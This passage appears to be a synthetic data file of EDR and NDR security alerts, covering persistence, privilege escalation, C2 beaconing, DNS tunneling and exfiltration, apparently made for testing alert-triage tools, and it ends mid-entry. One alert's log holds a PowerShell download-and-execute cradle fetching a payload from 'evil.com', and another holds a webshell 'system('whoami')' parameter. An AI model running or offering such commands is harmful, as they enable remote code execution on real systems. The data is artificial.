        "rule_id": "EDR-Rule-15-Web-Browser-Access-Local-Files",
        "rule_name": "Web browser process accessing sensitive local files",
        "alert_date": "2025-09-23T21:35:40Z",
        "tags": ["web-browser", "local-file-access", "data-exfiltration"],
        "severity": "Medium",
        "reference": "Chrome browser process accessed sensitive local files",
        "description": "Chrome browser process attempted to read a sensitive local file that should not normally be accessed by a browser, such as password or SSH key files. This may be a sign of a malicious extension or script.",
        "artifact": [
            {"type": "hostname", "value": "WKS-HR-03"},
            {"type": "process_name", "value": "chrome.exe"},
            {"type": "file_path", "value": "C:\\Users\\j.smith\\.ssh\\id_rsa"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-hr-03",
            "timestamp": "2025-09-23T21:35:39.876Z",
            "event_type": "FileRead",
            "process_info": {"pid": 1122, "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
            "file_info": {"path": "C:\\Users\\j.smith\\.ssh\\id_rsa"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-16-Scheduled-Task-Creation",
        "rule_name": "Suspicious scheduled task creation",
        "alert_date": "2025-09-23T21:40:20Z",
        "tags": ["persistence", "scheduled-task"],
        "severity": "High",
        "reference": "Host SRV-PROD-01 created suspicious scheduled task",
        "description": "A new scheduled task was created on host SRV-PROD-01 intended to execute a suspicious executable at 3 AM every day. This is a common persistence mechanism.",
        "artifact": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "task_name", "value": "MaliciousUpdater"},
            {"type": "task_command", "value": "C:\\ProgramData\\backdoor.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T21:40:19.444Z",
            "event_type": "ScheduledTaskCreation",
            "process_info": {"pid": 888, "path": "C:\\Windows\\System32\\schtasks.exe"},
            "task_details": {"name": "MaliciousUpdater", "command": "C:\\ProgramData\\backdoor.exe", "schedule": "daily at 03:00 AM"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-17-Privilege-Escalation-Exploit-Attempt",
        "rule_name": "Privilege escalation exploit attempt",
        "alert_date": "2025-09-23T21:45:00Z",
        "tags": ["privilege-escalation", "vulnerability-exploit"],
        "severity": "Critical",
        "reference": "Host FIN-WKS-JDOE-05 detected privilege escalation attempt",
        "description": "A low-privilege process on host FIN-WKS-JDOE-05 attempted to escalate its privileges through a known Windows vulnerability pattern. This behavior is similar to CVE-2020-0796 exploitation.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "vulnerability", "value": "CVE-2020-0796 (SMBGhost)"},
            {"type": "process_name", "value": "exploit.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-fin-05",
            "timestamp": "2025-09-23T21:44:59.123Z",
            "event_type": "PrivilegeEscalationAttempt",
            "process_info": {"pid": 9999, "path": "C:\\temp\\exploit.exe"},
            "exploit_details": {"technique": "SMBGhost", "target_system": "kernel"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-18-Local-Credential-Theft-LSASS-Memory-Access",
        "rule_name": "Local credential theft (LSASS memory access)",
        "alert_date": "2025-09-23T21:50:30Z",
        "tags": ["credential-theft", "lsass", "lateral-movement"],
        "severity": "Critical",
        "reference": "Host SRV-PROD-01 remote access to lsass.exe",
        "description": "A process on host SRV-PROD-01 attempted to remotely access lsass.exe memory from another host (192.168.1.55). This indicates attackers using stolen credentials for lateral movement.",
        "artifact": [
            {"type": "hostname", "value": "SRV-PROD-01"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "source_ip", "value": "192.168.1.55"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-prod-01",
            "timestamp": "2025-09-23T21:50:29.987Z",
            "event_type": "RemoteProcessAccess",
            "source_info": {"ip": "192.168.1.55"},
            "target_process": {"pid": 555, "path": "C:\\Windows\\System32\\lsass.exe"},
            "access_rights": "PROCESS_VM_READ"
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-19-Suspicious-Script-Execution",
        "rule_name": "Suspicious script execution",
        "alert_date": "2025-09-23T21:55:10Z",
        "tags": ["scripting", "macro", "download-cradle"],
        "severity": "High",
        "reference": "Host MKT-WKS-ASMITH-01 executed download script",
        "description": "On host MKT-WKS-ASMITH-01, WScript.exe process executed a VBScript containing remote download commands ('IEX').",
        "artifact": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "process_name", "value": "wscript.exe"},
            {"type": "script_command", "value": "wscript.exe script.vbs"},
            {"type": "download_cradle", "value": "IEX(New-Object Net.WebClient)..."}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-mkt-01",
            "timestamp": "2025-09-23T21:55:09.111Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 1234, "path": "C:\\Windows\\System32\\wscript.exe", "command_line": "wscript.exe c:\\temp\\script.vbs"},
            "script_content_snippet": "Set objShell = CreateObject(\"WScript.Shell\"): objShell.Run \"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-20-Unusual-Parent-Child-Process-Web-Server",
        "rule_name": "Web server process anomalous child process",
        "alert_date": "2025-09-23T22:00:00Z",
        "tags": ["web-server", "process-anomaly", "vulnerability"],
        "severity": "Critical",
        "reference": "IIS process launched cmd.exe",
        "description": "The IIS worker process (w3wp.exe) on web server (SRV-WEB-02) created a command prompt (cmd.exe) process. This behavior typically indicates exploitation of a web vulnerability such as Web Shell or remote command execution.",
        "artifact": [
            {"type": "hostname", "value": "SRV-WEB-02"},
            {"type": "parent_process", "value": "w3wp.exe"},
            {"type": "child_process", "value": "cmd.exe"}
        ],
        "raw_log": {
            "sensor_id": "edr-agent-web-02",
            "timestamp": "2025-09-23T21:59:59.000Z",
            "event_type": "ProcessCreation",
            "process_info": {"pid": 5678, "parent_pid": 1234, "parent_path": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                             "path": "C:\\Windows\\System32\\cmd.exe"}
        }
    }
]

ndr_alert = [
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-05-Suspect-C2-Communication",
        "rule_name": "Suspicious command and control (C2) communication",
        "alert_date": "2025-09-18T13:35:10Z",
        "tags": ["c2", "cobaltstrike", "network"],
        "severity": "Critical",
        "reference": "Host FIN-WKS-JDOE-05 communicating with known C2 server",
        "description": "Host FIN-WKS-JDOE-05 initiated outbound connection to IP address 198.51.100.50 marked as malicious C2 server. Traffic characteristics match Cobalt Strike Beacon pattern highly.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "198.51.100.50"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_port", "value": "443"},
            {"type": "protocol", "value": "HTTPS"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-18T13:35:09.800Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "192.168.1.101",
                "source_port": 51234,
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "protocol": "TCP",
                "bytes_in": 1024,
                "bytes_out": 512,
                "duration_seconds": 5
            },
            "network_context": {
                "destination_domain": "known-bad.c2.server",
                "threat_intel": {"source": "threat-feed-X", "match": "Cobalt Strike C2 server"}
            },
            "device_details": {"hostname": "FIN-WKS-JDOE-05"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-12-Lateral-Movement-Attempt",
        "rule_name": "Host-to-host lateral movement attempt",
        "alert_date": "2025-09-18T14:12:00Z",
        "tags": ["lateral-movement", "internal-scan"],
        "severity": "High",
        "reference": "Host FIN-WKS-JDOE-05 initiated anomalous connections to domain controller SRV-DC-01",
        "description": "Detected workstation FIN-WKS-JDOE-05 initiating a large number of SMB and LDAP connections to domain controller SRV-DC-01, which deviates from normal user behavior and indicates possible lateral movement or reconnaissance activity.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "10.10.1.5"},
            {"type": "destination_hostname", "value": "SRV-DC-01"},
            {"type": "protocol", "value": "SMB", "port": 445},
            {"type": "protocol", "value": "LDAP", "port": 389}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-18T14:11:59.550Z",
            "event_type": "AnomalousFlow",
            "flow_details": {
                "source_ip": "192.168.1.101",
                "destination_ip": "10.10.1.5",
                "destination_port": [445, 389],
                "protocol": ["SMB", "LDAP"],
                "flow_count": 25,
                "flow_rate_per_sec": 5
            },
            "network_context": {
                "source_device_type": "workstation",
                "destination_device_type": "domain-controller",
                "behavior_anomaly": "Unusual high-volume SMB/LDAP traffic from a workstation to a DC"
            },
            "device_details": {"hostname": "FIN-WKS-JDOE-05"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-15-Unauthorized-Data-Exfiltration",
        "rule_name": "Abnormal data exfiltration",
        "alert_date": "2025-09-18T14:18:30Z",
        "tags": ["exfiltration", "data-transfer", "unusual-port"],
        "severity": "High",
        "reference": "Host SRV-DC-01 transferring abnormal data volume to external IP",
        "description": "Domain controller SRV-DC-01 is sending a large volume of encrypted data over a non-standard port (44443) to external IP 203.0.113.78. This pattern is commonly associated with data exfiltration.",
        "artifact": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "source_ip", "value": "10.10.1.5"},
            {"type": "destination_ip", "value": "203.0.113.78"},
            {"type": "destination_port", "value": "44443"},
            {"type": "data_volume", "value": "1.2 GB"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-dc",
            "timestamp": "2025-09-18T14:18:29.112Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "10.10.1.5",
                "destination_ip": "203.0.113.78",
                "destination_port": 44443,
                "protocol": "TCP",
                "bytes_out": 1200000000,
                "duration_seconds": 180
            },
            "network_context": {
                "flow_direction": "outbound",
                "behavior_anomaly": "Large volume of data transfer on an unusual port to an external host"
            },
            "device_details": {"hostname": "SRV-DC-01"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-12-Lateral-Movement-Attempt",
        "rule_name": "Host-to-host lateral movement attempt",
        "alert_date": "2025-09-18T14:20:05Z",
        "tags": ["lateral-movement", "internal-scan"],
        "severity": "High",
        "reference": "Host SRV-DC-01 initiated anomalous connections to file server SRV-FILE-02",
        "description": "Detected domain controller SRV-DC-01 scanning and attempting connections to SRV-FILE-02 (file server). This pattern aligns with an attacker performing lateral movement to locate new targets.",
        "artifact": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "source_ip", "value": "10.10.1.5"},
            {"type": "destination_ip", "value": "10.10.2.18"},
            {"type": "destination_hostname", "value": "SRV-FILE-02"},
            {"type": "protocol", "value": "SMB", "port": 445}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-dc",
            "timestamp": "2025-09-18T14:20:04.990Z",
            "event_type": "AnomalousFlow",
            "flow_details": {
                "source_ip": "10.10.1.5",
                "destination_ip": "10.10.2.18",
                "destination_port": 445,
                "protocol": "SMB",
                "flow_count": 50,
                "flow_rate_per_sec": 10
            },
            "network_context": {
                "source_device_type": "domain-controller",
                "destination_device_type": "file-server",
                "behavior_anomaly": "Port scan/enumeration activity from a DC to a file server"
            },
            "device_details": {"hostname": "SRV-DC-01"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-05-Suspect-C2-Communication",
        "rule_name": "Suspicious command and control (C2) communication",
        "alert_date": "2025-09-18T14:40:15Z",
        "tags": ["c2", "cobaltstrike", "network"],
        "severity": "Critical",
        "reference": "Host FIN-WKS-JDOE-05 maintaining persistent communication with known C2 server",
        "description": "Persistent, low-volume periodic outbound connections observed between FIN-WKS-JDOE-05 and known C2 server known-bad.c2.server (198.51.100.50). This communication pattern is characteristic of ongoing command and control beaconing.",
        "artifact": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "198.51.100.50"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_port", "value": "443"},
            {"type": "protocol", "value": "HTTPS"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-18T14:40:14.654Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "192.168.1.101",
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "protocol": "HTTPS",
                "bytes_in": 256,
                "bytes_out": 128,
                "duration_seconds": 2
            },
            "network_context": {
                "flow_direction": "outbound",
                "threat_intel": {"source": "threat-feed-X", "match": "Cobalt Strike C2 server"}
            },
            "behavior_pattern": "Periodic, low-volume communication typical of a beaconing C2"
        }
    }, {
        "source": "NDR",
        "rule_id": "NDR-Rule-01-C2-Beaconing",
        "rule_name": "C2 beaconing traffic",
        "alert_date": "2025-09-24T09:05:00Z",
        "tags": ["c2", "malware", "beaconing", "outbound"],
        "severity": "Critical",
        "reference": "Host 192.168.1.101 performing periodic communication with external C2 server",
        "description": "Host 192.168.1.101 initiated periodic small-packet communications with external IP 104.22.56.78. This behavior strongly matches a command-and-control (C2) beaconing pattern.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "104.22.56.78"},
            {"type": "protocol", "value": "HTTPS"},
            {"type": "frequency", "value": "every 60 seconds"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T09:04:59.876Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "104.22.56.78",
            "dst_port": 443,
            "flow_id": "f12345",
            "packet_count": 5,
            "data_size_bytes": 250,
            "observed_behavior": "Periodic, low-volume communication"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-02-Internal-Port-Scan",
        "rule_name": "Internal port scan",
        "alert_date": "2025-09-24T09:10:30Z",
        "tags": ["reconnaissance", "lateral-movement", "port-scan"],
        "severity": "High",
        "reference": "Host 192.168.2.50 scanning multiple internal hosts",
        "description": "Host 192.168.2.50 attempted connections to many IP addresses and ports within the same subnet in a short time—typical internal reconnaissance behavior.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "target_subnet", "value": "192.168.2.0/24"},
            {"type": "scan_type", "value": "TCP SYN Scan"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T09:10:29.987Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ips": ["192.168.2.51", "192.168.2.52", "192.168.2.53", "..."],
            "dst_ports": [22, 80, 443, 3389, "..."],
            "count": 250
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-03-DNS-Tunneling",
        "rule_name": "DNS tunneling communication",
        "alert_date": "2025-09-24T09:15:20Z",
        "tags": ["dns-tunneling", "exfiltration", "malware"],
        "severity": "Critical",
        "reference": "Host 192.168.3.88 generated numerous abnormal DNS queries",
        "description": "Host 192.168.3.88 issued many DNS queries containing long, meaningless subdomains—commonly used for data exfiltration or C2 over DNS.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "query_domain", "value": "a1b2c3d4e5f6.malicious-domain.com"},
            {"type": "query_volume", "value": "100+ queries/min"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-03",
            "timestamp": "2025-09-24T09:15:19.444Z",
            "event_type": "DNSQuery",
            "src_ip": "192.168.3.88",
            "query": "a1b2c3d4e5f6g7h8.malicious-domain.com",
            "query_type": "A"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-04-Lateral-Movement-SMB-Anomaly",
        "rule_name": "SMB lateral movement anomaly",
        "alert_date": "2025-09-24T09:20:00Z",
        "tags": ["lateral-movement", "smb", "insider-threat"],
        "severity": "High",
        "reference": "Host 192.168.1.101 made SMB connections to sensitive servers",
        "description": "Host 192.168.1.101 (regular workstation) initiated unplanned SMB connections to HR and Finance servers, deviating from its historical traffic pattern.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "192.168.10.20"},
            {"type": "protocol", "value": "SMB (445)"},
            {"type": "destination_server", "value": "SRV-HR-FILES"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T09:19:59.123Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "192.168.10.20",
            "dst_port": 445,
            "user": "j.doe",
            "behavioral_score": 9.5
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-05-Exfiltration-Spike",
        "rule_name": "Data exfiltration traffic spike",
        "alert_date": "2025-09-24T09:25:40Z",
        "tags": ["data-exfiltration", "upload", "anomaly"],
        "severity": "High",
        "reference": "Host 192.168.4.12 uploaded large volume of data to external server",
        "description": "Host 192.168.4.12 uploaded an unusually large volume of HTTPS encrypted data to an external IP within 5 minutes—far exceeding its historical upload baseline.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_ip", "value": "52.8.10.20"},
            {"type": "protocol", "value": "HTTPS"},
            {"type": "data_volume_mb", "value": 500}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-04",
            "timestamp": "2025-09-24T09:25:39.999Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.4.12",
            "dst_ip": "52.8.10.20",
            "dst_port": 443,
            "upload_bytes": 524288000
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-06-Suspicious-RDP-Activity",
        "rule_name": "Suspicious RDP activity",
        "alert_date": "2025-09-24T09:30:10Z",
        "tags": ["lateral-movement", "rdp", "remote-access"],
        "severity": "Medium",
        "reference": "Non-admin workstation performing RDP connections",
        "description": "A regular workstation (192.168.2.50) not normally used for remote administration established RDP sessions to multiple servers, indicating possible lateral movement via RDP.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_ip", "value": "192.168.10.30"},
            {"type": "protocol", "value": "RDP (3389)"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T09:30:09.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "192.168.10.30",
            "dst_port": 3389,
            "protocol": "RDP"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-07-Internal-HTTP-to-Bad-Reputation-IP",
        "rule_name": "Internal HTTP connection to low-reputation IP",
        "alert_date": "2025-09-24T09:35:55Z",
        "tags": ["reputation", "malicious-ip", "botnet"],
        "severity": "High",
        "reference": "Host 192.168.1.101 connected to low-reputation IP",
        "description": "Host 192.168.1.101 made unencrypted HTTP communications to known low-reputation IP 198.51.100.25, suggesting potential malware infection.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "198.51.100.25"},
            {"type": "protocol", "value": "HTTP (80)"},
            {"type": "threat_score", "value": 95}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T09:35:54.666Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "198.51.100.25",
            "dst_port": 80
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-08-New-Service-Running-on-Unusual-Port",
        "rule_name": "New service running on unusual port",
        "alert_date": "2025-09-24T09:40:40Z",
        "tags": ["service-anomaly", "backdoor", "persistence"],
        "severity": "High",
        "reference": "Host 192.168.10.5 exposed a new listening service",
        "description": "A service unexpectedly began listening on non-standard port 8443 on server 192.168.10.5. This may indicate a backdoor or remote access tool.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.10.5"},
            {"type": "listening_port", "value": 8443},
            {"type": "protocol", "value": "TCP"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-05",
            "timestamp": "2025-09-24T09:40:39.111Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.10.5",
            "dst_ip": "192.168.10.5",
            "dst_port": 8443,
            "action": "LISTEN"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-09-Large-Unencrypted-Internal-File-Transfer",
        "rule_name": "Large unencrypted file transfer",
        "alert_date": "2025-09-24T09:45:15Z",
        "tags": ["data-in-motion", "policy-violation", "data-exfiltration"],
        "severity": "Low",
        "reference": "Host 192.168.2.50 performed large file transfer",
        "description": "Host 192.168.2.50 sent over 1 GB of unencrypted data to host 192.168.3.88, potentially violating data security policies.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_ip", "value": "192.168.3.88"},
            {"type": "protocol", "value": "FTP"},
            {"type": "data_volume_gb", "value": 1.2}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T09:45:14.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "192.168.3.88",
            "dst_port": 21,
            "protocol": "FTP",
            "upload_bytes": 1288490188
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-10-Web-Shell-Traffic-Signature",
        "rule_name": "WebShell traffic signature",
        "alert_date": "2025-09-24T09:50:00Z",
        "tags": ["web-shell", "post-exploitation", "web-application"],
        "severity": "Critical",
        "reference": "WebShell communication on web server 10.10.10.100",
        "description": "Web server 10.10.10.100 communicated with an external IP. Traffic contained HTTP parameters and patterns associated with the China Chopper WebShell.",
        "artifact": [
            {"type": "source_ip", "value": "10.10.10.100"},
            {"type": "destination_ip", "value": "172.67.100.200"},
            {"type": "protocol", "value": "HTTPS"},
            {"type": "attack_type", "value": "WebShell"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-06",
            "timestamp": "2025-09-24T09:49:59.000Z",
            "event_type": "HTTPFlow",
            "src_ip": "10.10.10.100",
            "dst_ip": "172.67.100.200",
            "http_host": "www.mycorp-web.com",
            "http_uri": "/images/shell.php",
            "http_body_params": "z0=system('whoami')"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-11-Malicious-SSL-Certificate",
        "rule_name": "Connection using malicious SSL certificate",
        "alert_date": "2025-09-24T09:55:30Z",
        "tags": ["ssl-tls", "malware", "c2"],
        "severity": "High",
        "reference": "Host 192.168.1.101 connected to server using malicious certificate",
        "description": "Host 192.168.1.101 established an HTTPS connection to a server using a self-signed SSL certificate flagged as malicious by threat intelligence—typical of C2 or malware communication.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "203.0.113.1"},
            {"type": "certificate_fingerprint", "value": "abacadaeafabacadaeafabacadaeafabacadae"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T09:55:29.876Z",
            "event_type": "TLSFlow",
            "src_ip": "192.168.1.101",
            "dst_ip": "203.0.113.1",
            "dst_port": 443,
            "ssl_info": {"issuer": "Self-Signed", "fingerprint_sha1": "abacadaeafabacadaeafabacadaeafabacadae"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-12-Database-Connection-Anomaly",
        "rule_name": "Database connection anomaly",
        "alert_date": "2025-09-24T10:00:15Z",
        "tags": ["database-access", "insider-threat", "data-exfiltration"],
        "severity": "Medium",
        "reference": "Host 192.168.2.50 connected to production database",
        "description": "Host 192.168.2.50 (workstation of a non-DBA employee) established a connection to a production database server, violating role-based access expectations.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_ip", "value": "192.168.10.50"},
            {"type": "protocol", "value": "SQL (1433)"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:00:14.666Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "192.168.10.50",
            "dst_port": 1433,
            "protocol": "SQLServer"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-13-Worm-like-Activity-Spike",
        "rule_name": "Worm-like propagation activity",
        "alert_date": "2025-09-24T10:05:40Z",
        "tags": ["worm", "propagation", "lateral-movement"],
        "severity": "Critical",
        "reference": "Host 192.168.1.101 made high-frequency connections to many hosts",
        "description": "Host 192.168.1.101 rapidly attempted connections to numerous random internal hosts—behavior consistent with worm or virus propagation.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "target_count", "value": "50+ unique IPs"},
            {"type": "rate", "value": "10 connections/sec"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T10:05:39.111Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_ips": ["192.168.1.5", "192.168.1.12", "192.168.1.34", "..."],
            "dst_port": 445
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-14-Encrypted-Traffic-Spike-to-New-Destination",
        "rule_name": "Encrypted traffic spike to new destination",
        "alert_date": "2025-09-24T10:10:05Z",
        "tags": ["encryption", "anomaly", "data-exfiltration"],
        "severity": "Medium",
        "reference": "Host 192.168.4.12 initiated large HTTPS flow to new external IP",
        "description": "Host 192.168.4.12 began sending a large volume of HTTPS encrypted data to previously unseen external IP 5.6.7.8—potential data exfiltration indicator.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.4.12"},
            {"type": "destination_ip", "value": "5.6.7.8"},
            {"type": "protocol", "value": "HTTPS"},
            {"type": "data_volume_mb", "value": 250}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-04",
            "timestamp": "2025-09-24T10:10:04.543Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.4.12",
            "dst_ip": "5.6.7.8",
            "dst_port": 443,
            "upload_bytes": 262144000
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-15-Unauthorized-Cloud-Access-Traffic",
        "rule_name": "Unauthorized cloud service access traffic",
        "alert_date": "2025-09-24T10:15:30Z",
        "tags": ["cloud-access", "policy-violation", "data-exfiltration"],
        "severity": "Low",
        "reference": "Host 192.168.2.50 connected to personal cloud storage",
        "description": "Host 192.168.2.50 initiated connections to non-approved personal cloud storage services (e.g., Dropbox, Google Drive).",
        "artifact": [
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "destination_domain", "value": "drive.google.com"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:15:29.876Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.2.50",
            "dst_ip": "142.250.191.110",
            "dst_port": 443,
            "app_protocol": "Google_Drive"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-16-DNS-Exfiltration-Slow-Rate",
        "rule_name": "Low-and-slow DNS data exfiltration",
        "alert_date": "2025-09-24T10:20:00Z",
        "tags": ["dns", "exfiltration", "low-and-slow"],
        "severity": "Medium",
        "reference": "Host 192.168.3.88 issuing low-rate DNS queries",
        "description": "Host 192.168.3.88 generated a small but continuous stream of DNS queries with long, meaningless subdomains—a classic low-and-slow data exfiltration technique.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.3.88"},
            {"type": "query_domain", "value": "a1b2.malicious-domain.com"},
            {"type": "query_volume", "value": "5 queries/min"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-03",
            "timestamp": "2025-09-24T10:19:59.000Z",
            "event_type": "DNSQuery",
            "src_ip": "192.168.3.88",
            "query": "a1b2c3d4.malicious-domain.com",
            "query_type": "A"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-17-P2P-Communication-Detected",
        "rule_name": "P2P communication detected",
        "alert_date": "2025-09-24T10:25:45Z",
        "tags": ["p2p", "policy-violation"],
        "severity": "Low",
        "reference": "Host 192.168.1.101 engaged in P2P communication",
        "description": "Traffic patterns from host 192.168.1.101 indicate participation in peer-to-peer (P2P) communications—violating policy and potentially aiding malware propagation.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "protocol", "value": "BitTorrent"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-01",
            "timestamp": "2025-09-24T10:25:44.888Z",
            "event_type": "NetworkFlow",
            "src_ip": "192.168.1.101",
            "dst_port": 6881,
            "app_protocol": "BitTorrent"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-18-Admin-Account-Unusual-Login",
        "rule_name": "Administrator account anomalous login",
        "alert_date": "2025-09-24T10:30:10Z",
        "tags": ["privileged-account", "anomaly", "lateral-movement"],
        "severity": "High",
        "reference": "Administrator account Admin-01 logged in at unusual time",
        "description": "Privileged account 'Admin-01' logged into a domain controller at night (outside normal hours) from a regular workstation (192.168.2.50), deviating from baseline behavior.",
        "artifact": [
            {"type": "username", "value": "Admin-01"},
            {"type": "source_ip", "value": "192.168.2.50"},
            {"type": "target_ip", "value": "192.168.10.100"},
            {"type": "time_of_day", "value": "after-hours"}
        ],
        "raw_log": {
            "sensor": "ndr-sensor-02",
            "timestamp": "2025-09-24T10:30:09.543Z",
            "event_type": "KerberosFlow",
            "client_ip": "192.168.2.50",
            "server_ip": "192.168.10.100",
            "account_name": "Admin-01",
            "service": "Kerberos_Authentication_Success"
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-19-DNS-DGA-Traffic",
        "rule_name": "DNS domain generation algorithm (DGA) traffic",
        "alert_date": "2025-09-24T10:35:55Z",
        "tags": ["dga", "c2", "malware"],
        "severity": "Critical",
        "reference": "Host 192.168.1.101 queried DGA domain",
        "description": "Host 192.168.1.101 issued DNS queries to a domain generated by a domain generation algorithm (DGA)—a common botnet technique to dynamically rotate C2 domains.",
        "artifact": [
            {"type": "source_ip", "value": "192.168.1.101"},
